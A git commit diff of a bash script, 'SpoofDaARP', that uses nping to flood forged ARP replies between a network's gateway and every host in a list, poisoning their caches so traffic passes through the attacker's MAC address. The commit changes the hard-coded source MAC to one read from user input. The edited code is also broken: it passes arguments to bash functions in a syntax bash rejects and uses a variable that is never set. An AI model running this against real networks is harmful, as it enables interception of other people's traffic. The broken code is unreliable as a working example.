765b391b8b6f35e6d29730f4c1d59b8f0fae6f8c
Eclipse <0-Eclipse-0@users.noreply.github.com>
2021-10-30 13:24:05 -0400

    Update spoofdaarp.sh

--- spoofdaarp.sh
+++ spoofdaarp.sh
@@ -19,19 +19,21 @@ on_kill ()
 	echo "[SpoofDaARP] All ARP Spoof processes killed!"
 }
 
-start_spoof () 
+start_spoof (source) 
 {
   gateway="$(cat gateway.txt)"
 	echo "[SpoofDaARP] Spoofing in 5 seconds. Run kill.sh to stop all spoofing processes..."
 	sleep 5s
 	while IFS= read -r ip; do
-		nping --arp-type arp-reply --source-mac 80:56:f2:38:3c:0e --source-ip "$gateway" -c 0 "$ip" &
-		nping --arp-type arp-reply --source-mac 80:56:f2:38:3c:0e --source-ip "$ip" -c 0 "$gateway" &
+		nping --arp-type arp-reply --source-mac $source --source-ip "$gateway" -c 0 "$ip" &
+		nping --arp-type arp-reply --source-mac $source --source-ip "$ip" -c 0 "$gateway" &
 	done < "arp_list.txt"
 }
 
 trap on_kill SIGHUP SIGINT SIGTERM # Kill nping processes
 
+echo "Source MAC: "
+read -r mac
 get_gateway_addr # Call Gateway Addr Function
 get_arp_list # Call Arp List Function
-start_spoof
+start_spoof(mac)
